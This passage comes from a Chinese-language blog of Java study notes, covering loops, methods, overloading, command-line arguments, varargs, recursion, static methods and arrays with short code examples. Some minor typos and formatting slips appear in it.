class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code>do{    }while();//注意有分号</code></pre></div></div></figure></li><li><p>for</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75">(初始化（可以空）</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">布尔表达式</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">更新){</span><span style="color: #7F848E; font-style: italic">//分号隔开</span></span><span class="line"><span style="color: #E06C75">    代码语句</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>在idea里面，写<strong>100.for</strong>可以直接生成</p></li><li><p>增强for</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ForDemo05</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">numbers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> {</span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">30</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">40</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">50</span><span style="color: #ABB2BF">}; </span><span style="color: #7F848E; font-style: italic">//定义了一个数组</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">x</span><span style="color: #C678DD">:</span><span style="color: #ABB2BF">numbers){</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(x);</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>遍历数组，每次for循环输出</p></li></ol><ul><li><p>While和do-While的区别:]</p><p>while先判断后执行。dowhile是先执行后判断!</p><p>Do…while总是保证循环体会被<strong>至少执行一次</strong>!这是他们的主要差别</p></li><li><p>break&amp;&amp;continue</p><p>break用于强制退出循环，不终止程序（放在判断后）</p><p>continue只是这一次不执行，下一次继续执行</p><p>（goto在java<strong>不存在</strong>）但是可以利用标签使用，起跳转作用</p></li></ul><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>方法类似于函数</p><ul><li><p>System.out.printIn()<br>类.对象.方法</p></li><li><p>Java方法是语句的集合，它们在一起执行一个功能</p><ul><li>方法是解决一类问题的步骤的有序组合</li><li>方法包含于类或对象中</li><li>方法在程序中被创建，在其他地方被引用</li></ul></li></ul><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Demo01</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//main方法</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">string</span><span style="color: #ABB2BF">[]</span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sum</span><span style="color: #56B6C2">=</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(a</span><span style="color: #C678DD">:</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,b</span><span style="color: #C678DD">:</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">);</span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(sum);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #7F848E; font-style: italic">//加法</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">int</span><span style="color: #61AFEF"> add</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">a</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">b</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> a</span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF">b;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>在写方法的时候<code>public  int add(int a,int b)</code>，要想调就要加一个<code>static</code></p><ul><li><p>设计方法的原则:方法的本意是功能块，就是实现某个功能的语句块的集合。我们设计方法的时候，最好保持方法的原子性，<strong>就是一个方法只完成1个功能，这样利于我们后期的扩展</strong></p><p>可以多用写一些方法，把main函数变得更加简洁</p></li></ul><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">修饰符 返回值类型 方法名(参数类型 参数名){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #E06C75">    方法体</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">....</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> 返回值</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//有返回类型，一定要写return</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><ul><li>当方法返回一个值的时候，方法调用通常被当做一个值</li><li>如果方法返回值是void，方法调用一定是一条语句</li></ul><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>函数名称相同，参数类型不同（返回值是谁，就调用谁）</p><p><code>参数类型也可以相同，在方法里面强制转化就行</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//比大小</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">max</span><span style="color: #E06C75">(</span><span style="color: #C678DD">double</span><span style="color: #E06C75"> num1</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">double</span><span style="color: #E06C75"> num2){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (num1</span><span style="color: #56B6C2">==</span><span style="color: #E06C75">num2){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;num1==num2&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//终止方法</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (num1</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">num2){</span></span><span class="line"><span style="color: #E06C75">        result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75">)num1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">        result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75">)num2</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> result</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>但是在调用的时候，要调配和方法相匹配，要不编译器会报错</p><h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CommandLine</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">[]){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">i</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; i</span><span style="color: #56B6C2">&lt;</span><span style="color: #E5C07B">args</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">; i++){</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;args[&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> i </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;]: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> args[i]);</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251022090113344</span><span style="color: #E06C75">](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125533446.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">直接在idea里面的命令行运行不成功，所以打开方法</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">所在文件夹，使用命令行编译，发现还是不行</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">因为运行需要在src目录下，回退完目录后，再次运行</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">源码定义的是一个数组，所以在语句后面跟上参数`</span><span style="color: #E5C07B">this</span><span style="color: #E06C75"> is kuangshen`</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">发现成功返回</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">**</span><span style="color: #E06C75">也就是说main方法也是可以传参的</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 可变参数</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">本质就是一个数组</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> JDK </span><span style="color: #D19A66">1.5</span><span style="color: #E06C75"> 开始，Java支持传递同类型的可变参数给一个方法。、</span></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75">   在方法声明中，在指定参数类型后加一个省略号(</span><span style="color: #ABB2BF">...</span><span style="color: #E06C75">)  </span></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">```java</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Demo04</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Demo04</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">demo04</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Demo04</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">demo04</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">test</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">45</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> test</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">... </span><span style="color: #E06C75; font-style: italic">i</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(i[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(i[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(i[</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(i[</span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(i[</span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(i[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 递归</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">自己调用自己</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">简单来说就是找到公式规律，然后往前一个未知数推导（复杂问题，简单化，减少重复计算，减少代码量）</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 递归结构包括两个部分：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  递归头</span><span style="color: #C678DD">:</span><span style="color: #E06C75">什么时候不调用自身方法，如果没有头，将陷入死循环</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  递归体</span><span style="color: #C678DD">:</span><span style="color: #E06C75">什么时候需要调用自身方法</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">java主要使用的是栈，就是罐子里面一个叠一个，</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">先放后拿</span><span style="color: #56B6C2">**</span><span style="color: #E06C75"> </span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 静态</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">非静态</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 静态：有static</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  在其他类里面写，可以在main里面调用 `类</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">方法`</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 非静态：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  调用：将类实例化new</span><span style="color: #ABB2BF">--------</span><span style="color: #C678DD">-&gt;</span><span style="color: #E06C75">对象类型  对象名</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">对象值</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```java</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #E5C07B">Student</span><span style="color: #E06C75"> student </span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">student</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>  <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125532966.png" alt="image-20251022215227014"></p><h2 id="调用-1"><a href="#调用-1" class="headerlink" title="调用"></a>调用</h2><ul><li>有static，和类一起加载，存在较早</li><li>无static，在类实例化之后才存在，比上面那个迟</li></ul><p>所以<strong>不能</strong>在有static，调用无static的方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125535537.png" alt="image-20251022215527356"></p><p><strong>b（）</strong>明显报错了</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>定义一组类型，相同类型的有序集合，通过下标访问</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="shiki jaVa"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre><code>public static void main(stringl args){    int[] nums; //1.定义    int nums2[];//2.c和c++使用的多}</code></pre></div></div></figure><p>没定义，返回默认值（int 的默认值就是0）</p><p>获取数组长度是<code>arrays。length</code></p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ul><li><p>静态初始化</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 静态初始化: 创建 + 赋值</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] a </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">7</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">8</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(a[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">]);</span></span></code></pre></div></div></figure></li><li><p>动态初始化（<code>包含默认初始化</code>）</p><p>先分配内存（初始化）（变成默认值），再赋值</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 动态初始化 : 包含默认初始化</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] b </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[</span><span style="color: #D19A66">10</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       b[</span><span style="color: #D19A66">0</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure></li><li><p>数组的默认初始化</p><p>就是分配内存的初始化</p></li></ul><h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><ol><li>堆</li><li>栈</li><li>方法区</li></ol><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">步骤 1：声明数组</span></span><span class="line"><span style="color: #abb2bf">代码int[] array = null;声明了一个整型数组变量array，并将其初始化为null，表示该数组目前没有指向任何实际的数组对象</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">步骤 2：创建数组</span></span><span class="line"><span style="color: #abb2bf">代码array = new int[10];创建了一个长度为 10 的整型数组，并将其引用赋值给array变量，此时数组的每个元素都有了默认值（整型数组默认值为 0）</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">步骤 3：给数组元素赋值</span></span><span class="line"><span style="color: #abb2bf">代码通过类似nums[0] = 1;这样的语句（这里变量名可能存在笔误，应为array），给数组的每个元素依次赋值，从array[0]到array[9]分别赋值为 1 到 10</span></span></code></pre></div></div></figure><p>先声明空数组（栈），在new一个数组（在堆内部分配空间），然后赋值（赋值）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125540714.png" alt="image-20251022153931969"></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>其长度是确定的。数组一旦被创建，它的大小就是不可以改变的。</li><li>其元素必须是相同类型,不允许出现混合类型</li><li>数组中的元素可以是任何数据类型，包括基本类型和引用类型</li><li>数组变量属引用类型，数组也可以看成是对象，数组中的每个元素相当于该对象的成员变量。</li><li>数组<strong>本身就是对象</strong>，Java中对象是在堆中的因此数组无论保存原始类型还是其他对象类型，<strong>数组对象本身是在堆中的</strong></li><li>数组下标越界会报错（边界异常）</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul><li><p>打印所有的数组元素</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">arrays</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">System</span><span style="color: 